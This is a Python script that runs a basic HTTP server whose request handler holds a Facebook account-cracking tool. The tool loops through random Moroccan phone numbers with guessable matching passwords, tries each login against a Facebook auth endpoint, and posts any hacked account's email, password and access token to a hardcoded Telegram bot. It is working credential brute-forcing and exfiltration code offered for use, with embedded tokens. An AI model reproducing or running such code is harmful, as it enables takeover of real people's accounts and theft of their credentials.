import http.server
import socketserver
import sys

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # يمكنك إضافة الأكواد الإضافية هنا

        import requests,sys,time,os,random,pyfiglet,colorama
        from time import sleep
        E = '\033[1;31m'
        G = '\033[1;32m'
        S = '\033[1;33m'
        os.system('clear')
        print(str(pyfiglet.figlet_format('FaceBook'))+f"{S}Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"FB: {colorama.Fore.CYAN}MoroccoAI{colorama.Fore.RESET}")
        ID= '1758975211'
        tok= '7160121436:AAEb846gUsrXPjPTw5t2ERT1zNxqkZzd9nA'
        print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        user = '1234567890'
        def code_whisper(email,password):
            url = 'https://api.facebook.com/method/auth.login'
            headers = {
            'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
            'Accept-Language' : 'en-US,en;q=0.5'
            }
            data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

            req = requests.post(url, headers=headers, data=data)
            id = str(req.json()['uid'])
            con = str(req.json()['identifier'])
            tkn = str(req.json()['access_token'])
            tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.💀. Hacked FaceBook From @crackingdzz💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> {id}\n.✉. E-mail ==> {email} \n.🚫. PassWord ==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @cr''')
            i = requests.post(tlg)
            print(f'{G}.💀. Hacked FaceBook From .💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> {id}\n.✉. E-mail ==> {email} \n.🚫. PassWord ==> {password}\n.📨. Confirmed E-mail ==> {con}\n.📃. Access Token ==> {tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈. Tele ==> @cra')
        while True:
            whisper = str("".join(random.choice(user)for i in range(7)))
            email= '+21261'+whisper
            password = '061'+whisper
            if email =='':
                exit()
            if password =='':
                exit()
            url = 'https://api.facebook.com/method/auth.login'
            headers = {
            'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
            'Accept-Language' : 'en-US,en;q=0.5'
            }
            data = { 'email': email, 'password': password, 'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32", 'locale': "en_DZ", 'format': 'JSON' }

            req = requests.post(url, headers=headers, data=data)
        #    print(req.json())
            if 'access_token' in req.json():
                code_whisper(email,password)
            if '(405)' in req.json()['error_msg']:
                print(f'{S}CheckPoint {email}:{password}')
            else:
                print(f'{E}E-mail ==> {email} | PassWord ==> {password}')
        
        super().do_GET()

port = 8080
address = ("", port)

try:
    with socketserver.TCPServer(address, MyRequestHandler) as server:
        print(f"الخادم يعمل على المنفذ {port}")
        server.serve_forever()
except OSError as e:
    if e.errno == 98:
        print("المنفذ مستخدم بالفعل. جاري إعادة تشغيل الخادم...")
        server.shutdown()
        server.server_close()
        with socketserver.TCPServer(address, MyRequestHandler) as server:
            print(f"الخادم يعمل على المنفذ {port}")
            server.serve_forever()
    else:
        print(f"خطأ: {e}")
        sys.exit(1)
